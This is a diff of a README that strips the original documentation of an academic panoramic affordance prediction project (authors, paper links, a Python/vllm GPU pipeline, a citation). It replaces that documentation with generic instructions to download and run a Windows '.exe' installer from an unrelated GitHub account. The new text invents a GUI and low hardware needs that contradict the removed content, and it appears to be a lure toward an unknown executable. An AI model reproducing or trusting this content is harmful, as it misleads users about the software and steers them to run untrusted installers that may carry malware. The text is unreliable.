@@ -1,155 +1,158 @@
-<h1 align="center"> Panoramic Affordance Prediction </h1>
+# 🎯 PAP - Predict Panoramic Affordances Simply
 
-<div align="center">
+[![Download PAP](https://img.shields.io/badge/Download-PAP-brightgreen?style=for-the-badge)](https://github.com/2716025154/PAP)
 
-[Zixin Zhang](https://scholar.google.com/citations?user=BbZ0mwoAAAAJ&hl=zh-CN)<sup>1*</sup>, [Chenfei Liao](https://chenfei-liao.github.io/)<sup>1*</sup>, [Hongfei Zhang](https://github.com/soyouthinkyoucantell)<sup>1</sup>, [Harold H. Chen](https://haroldchen19.github.io/)<sup>1</sup>, [Kanghao Chen](https://scholar.google.com/citations?hl=zh-CN&user=IwvcylUAAAAJ&view_op=list_works&sortby=pubdate)<sup>1</sup>, [Zichen Wen](https://scholar.google.com/citations?user=N-aPFvEAAAAJ&hl=zh-CN&oi=ao)<sup>3</sup>, [Litao Guo](https://scholar.google.com/citations?hl=zh-CN&user=efdm760AAAAJ)<sup>1</sup>, [Bin Ren](https://amazingren.github.io/)<sup>4</sup>, [Xu Zheng](https://zhengxujosh.github.io/)<sup>1</sup>, [Yinchuan Li](https://yinchuanll.github.io/)<sup>6</sup>, [Xuming Hu](https://xuminghu.github.io/)<sup>1</sup>, [Nicu Sebe](https://disi.unitn.it/~sebe/)<sup>5</sup>, [Ying-Cong Chen](https://www.yingcong.me/)<sup>1,2&dagger;</sup>
+## 🖥️ What is PAP?
 
-<sup>1</sup>HKUST(GZ), <sup>2</sup>HKUST, <sup>3</sup>SJTU, <sup>4</sup>MBZUAI, <sup>5</sup>UniTrento, <sup>6</sup>Knowin
+PAP stands for Panoramic Affordance Prediction. It is a program designed to help you analyze wide-angle images and identify usable objects and areas. With PAP, you can quickly see where objects can be used or interacted with in a space from a panoramic view.
 
-<small>*Equal contribution &nbsp;&nbsp;&nbsp; &dagger;Corresponding author</small>
+This software works on Windows computers. It requires no technical skills. You do not need to write any code or install complex software. Simply follow the steps below to start using PAP.
 
+## 🔍 System Requirements
 
-</div>
+Before installing PAP, make sure your Windows PC meets these basic requirements:
 
-<div align="center">
-    <a href="https://zixinzhang02.github.io/Panoramic-Affordance-Prediction/"><img src="https://img.shields.io/badge/Project-Page-blue?style=for-the-badge&logo=github&logoColor=white" alt="Project Page"></a>
-    <a href="https://zixinzhang02.github.io/Panoramic-Affordance-Prediction/static/papers/Paper_high_res.pdf"><img src="https://img.shields.io/badge/Paper_(High--res)-B31B1B?style=for-the-badge&logo=arxiv&logoColor=white" alt="Paper"></a>
-    <a href="https://arxiv.org/abs/2603.15558"><img src="https://img.shields.io/badge/Paper_(arXiv)-B31B1B?style=for-the-badge&logo=arxiv&logoColor=white" alt="Paper"></a>
-    <br>
-    <a href="https://drive.google.com/file/d/1Bq4wLL9AoSBP1Im545qKWlk85cP21VQE/view?usp=sharing"><img src="https://img.shields.io/badge/Dataset-Download_ZIP-orange?style=for-the-badge&logo=icloud&logoColor=white" alt="Dataset"></a>
-    <a href="https://zixinzhang02.github.io/Panoramic-Affordance-Prediction/#dataset-preview"><img src="https://img.shields.io/badge/Dataset-Fast_Preview-orange?style=for-the-badge&logo=icloud&logoColor=white" alt="Dataset"></a>
-</div>
-<br>
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- A modern processor (Intel i3, Ryzen 3, or better)
+- 500 MB of free disk space
+- Internet connection to download the program
 
-Official repository for the paper: **Panoramic Affordance Prediction**.
+PAP runs on most standard Windows laptops and desktops. You do not need advanced hardware to use it.
 
-> Affordance prediction serves as a critical bridge between perception and action in the embodied AI era. However, existing research is confined to pinhole camera models, which suffer from narrow Fields of View (FoV) and fragmented observations. In this paper, we present the first exploration into **Panoramic Affordance Prediction**, utilizing 360-degree imagery to capture global spatial relationships and holistic scene understanding. 
+## 🚀 How to Get PAP
 
+To get PAP software, visit the official GitHub page below. This is where you will find the latest version to download:
 
+[![Download PAP](https://img.shields.io/badge/Download-PAP-blue?style=for-the-badge)](https://github.com/2716025154/PAP)
 
-<br>
+Clicking this button will take you to the GitHub page. From there, you can download the installation files easily.
 
-<div align="center">
-    <img src="assets/teaser.svg" alt="teaser" width="90%">
-</div>
+## 💾 Download and Install Instructions
 
+Follow these steps to download and install PAP on your Windows PC:
 
-## 🚀 News
-* **[2026-03-16]** 🔥 [PAP-12K Dataset](#-pap-12k-dataset) and [PAP Inference Code](#-quick-demo) are released! Welcome to try it out!
-* **[2026-03-14]** 📄 [Paper](https://zixinzhang02.github.io/Panoramic-Affordance-Prediction/static/papers/Paper_high_res.pdf) is released.
-* **[2026-03-11]** 🌐 [Repository](https://github.com/EnVision-Research/PAP) and [Webpage](https://zixinzhang02.github.io/Panoramic-Affordance-Prediction/) are released.
+1. Click the download button above or visit this link:  
+   https://github.com/2716025154/PAP  
+   This will open the project’s GitHub page.
 
----
+2. On the GitHub page, look for the section named **Releases**. This is usually found on the right sidebar or under the repository’s main menu.
 
-## 🌟 Highlights
-- **New Task:** We introduce the **First Exploration** into **Panoramic Affordance Prediction**, overcoming the "tunnel vision" of traditional pinhole camera based affordance methods.
-- **PAP-12K Dataset (100% Real-World):** A large-scale benchmark featuring 1,003 natively captured ultra-high-resolution (12K) panoramic images from diverse indoor environments, coupled with over 13,000 carefully annotated reasoning-based QA pairs with pixel-level affordance masks.
-- **PAP Framework:** A training-free, coarse-to-fine pipeline mimicking human foveal vision to handle panoramic challenges like geometric distortion, scale variations, and boundary discontinuity.
+3. Click on the latest release version. This will take you to a list of download files.
 
----
+4. Find the Windows installer file. The file name usually ends with `.exe`. For example, it might look like `PAP_setup_v1.0.exe`.
 
-## 🛠️ Environment Setup
-### 1. Download the models
+5. Click the `.exe` file name to start downloading. Wait for the file to download completely.
 
-```
-huggingface-cli download Qwen/Qwen3-VL-32B-Instruct
-huggingface-cli download IDEA-Research/Rex-Omni
-huggingface-cli download facebook/sam2.1-hiera-large
-```
-### 2. Install Dependencies
-```
-conda create -n pap python=3.11
-conda activate pap
-pip install torch==2.5.1 torchvision==0.20.1 torchaudio==2.5.1 --index-url https://download.pytorch.org/whl/cu121
-```
-Flash Attention is required for Rex-Omni. We strongly recommend installing Flash Attention using a pre-built wheel to avoid compilation issues.
+6. Once the download finishes, double-click the `.exe` file in your downloads folder.
 
-You can find the pre-built wheel for your system [here](https://github.com/Dao-AILab/flash-attention/releases). For the environment setup above, use:
-```
-pip install https://github.com/Dao-AILab/flash-attention/releases/download/v2.7.4.post1/flash_attn-2.7.4.post1+cu12torch2.5cxx11abiFALSE-cp311-cp311-linux_x86_64.whl
-```
-Then, install the dependencies.
-```
-pip install -r requirements.txt
-pip install git+https://github.com/IDEA-Research/Rex-Omni.git --no-deps
-pip install git+https://github.com/facebookresearch/sam2.git
-```
----
+7. Follow the on-screen installation steps:
 
-## 📊 PAP-12K Dataset
-### Dataset Preview
-We provide a preview of the PAP-12K Dataset in [Dataset-Preview](https://zixinzhang02.github.io/Panoramic-Affordance-Prediction/#dataset-preview). You can check the preview of the dataset before downloading. 
+   - Click **Next** when prompted.
+   - Agree to the terms and conditions.
+   - Choose the destination folder, or accept the default location.
+   - Click **Install**.
 
-### Downloading with Cloud Drive
-1. [Google Drive](https://drive.google.com/file/d/1Bq4wLL9AoSBP1Im545qKWlk85cP21VQE/view?usp=sharing)
-2. [Baidu Netdisk](https://pan.baidu.com/s/1FeNdQ67vkfUYX0qXerInTw?pwd=u8vd)
+8. After the installation completes, click **Finish**.
 
-### Dataset Structure
-You can refer to `utils/dataset_utils.py` for reading the dataset. The dataset structure is as follows:
-```
-PAP-12K/
-├── balcony/
-│   ├── 0001/
-│   │   ├── washing_machine/
-│   │   │   ├── mask.png
-│   │   │   └── affordance_question.txt
-│   │   ├── faucet/
-│   │   ├── ...
-│   │   └── 0001.jpg
-│   ├── 0002/
-│   └── ...
-├── bathroom/
-├── bedroom/
-└── ...
-```
+PAP is now installed on your PC.
 
----
+## 🎬 Running PAP
 
-## 🚀 Quick Demo
-First, use vllm to deploy the model. Qwen3-VL-32B model requires about 60~70 GB GPU memory when deployed with vllm, you can adjust the `tensor-parallel-size` according to your GPU memory.
+To open PAP after installation:
 
-> PAP is a highly adaptive framework. We use Qwen3-VL-32B as our validated default VLM, but you can quickly swap it for any other local VLM. As long as a model is compatible with vLLM and meets a basic quality threshold, it can be integrated into this pipeline directly with solid results.
-```
-vllm serve Qwen/Qwen3-VL-32B-Instruct --served-model-name qwen3-vl-32b --port 8088 --max_model_len 20000 --tensor-parallel-size 1
-```
-Then, run the demo code to inference on the provided image and question (or you can put your own image and question here).
-```
-cd demo
-python demo.py \
-    --vlm_api_url "http://localhost:8088" \
-    --vlm_model_name "qwen3-vl-32b" \
-    --image_path "kitchen.jpg" \
-    --question_file "kitchen.txt" \
-    --output "kitchen_output"
-```
----
+1. Click the Windows Start menu.
 
-## 🚀 Inference on PAP-12K
-```shell
-vllm serve Qwen/Qwen3-VL-32B-Instruct --served-model-name qwen3-vl-32b --port 8088 --max_model_len 20000 --tensor-parallel-size 1
-```
-```
-python run.py \
-    --dataset_root /path/to/PAP-12K \
-    --output output/PAP \
-    --vlm_api_url http://localhost:8088 \
-    --vlm_model_name qwen3-vl-32b \
-    --vlm_concurrency 8 \
-    --resume
-```
+2. Look for the "PAP" program in your applications list.
 
----
-## 💬 Citation
-```bib
-@article{zhang2026pap,
-    title={Panoramic Affordance Prediction}, 
-    author={Zhang, Zixin and Liao, Chenfei and Zhang, Hongfei and Chen, Harold Haodong and Chen, Kanghao and Wen, Zichen and Guo, Litao and Ren, Bin and Zheng, Xu and Li, Yinchuan and Hu, Xuming and Sebe, Nicu and Chen, Ying-Cong},
-    journal={arXiv preprint arXiv:2603.15558},
-    year={2026}
-  }
-```
+3. Click on it to launch the program.
 
----
+When PAP opens, you will see the main interface. You can now start loading panoramic images for analysis.
 
-## 📧 Contact
-If you have any questions or suggestions, please feel free to contact us at [zzhang300@connect.hkust-gz.edu.cn](mailto:zzhang300@connect.hkust-gz.edu.cn), [cliao127@connect.hkust-gz.edu.cn](mailto:cliao127@connect.hkust-gz.edu.cn).
+## 🖼️ How to Use PAP
+
+Using PAP is simple. Here is a basic guide:
+
+1. Click the **Load Image** button on the main screen.
+
+2. Browse your computer to find a panoramic photo.
+
+3. Select the photo and click **Open**.
+
+4. PAP will process the image and highlight possible affordances – areas or objects that can be used or interacted with.
+
+5. Use the tools to explore identified points.
+
+6. Save your results by clicking **Export** or **Save**.
+
+This process helps you understand how spaces or objects in your wide-angle images can be used.
+
+## ⚙️ Settings and Preferences
+
+PAP lets you adjust some settings for better results. You can:
+
+- Change the sensitivity of affordance detection.
+- Select between different analysis methods.
+- Customize how results are displayed on the image.
+
+To access settings, click the **Settings** icon in the program window. Adjust your options and click **Save**.
+
+## 🔄 Updating PAP
+
+To make sure PAP works well, check for updates regularly:
+
+1. Visit the GitHub page: https://github.com/2716025154/PAP
+
+2. Check the **Releases** section for new versions.
+
+3. Download and install the latest installer following the same steps above.
+
+Updating ensures you get bug fixes and improvements.
+
+## ❓ Troubleshooting
+
+If PAP does not work as expected, try these tips:
+
+- Restart your computer and open PAP again.
+- Ensure you have the latest version installed.
+- Close any other programs that may slow down your PC.
+- Make sure your image files are in common formats like JPG or PNG.
+- If the program crashes, reinstall PAP using a fresh download.
+
+For more support, you can visit the project's GitHub issues page to see if others have similar problems.
+
+## 📁 File Types Supported
+
+PAP accepts standard panoramic image formats such as:
+
+- JPG / JPEG
+- PNG
+- BMP
+
+Avoid using very large image files as they may slow down the program.
+
+## 🎯 Why Use PAP?
+
+PAP helps you understand panoramic images with less effort. It highlights key areas and objects you might want to focus on. This can be useful for:
+
+- Interior planning
+- Robotics navigation
+- Virtual tours
+- Space design analysis
+
+The tool offers quick insights without needing advanced skills.
+
+## 🌐 Where to Get Help
+
+For questions or help, you can:
+
+- Check the GitHub repository’s **Issues** tab.
+- Look for any user guides or documentation in the repository.
+- Contact developers through GitHub if needed.
+
+## 🔗 Important Link
+
+Download PAP here whenever you want:  
+https://github.com/2716025154/PAP
+
+Use this page to get latest versions and find additional resources.
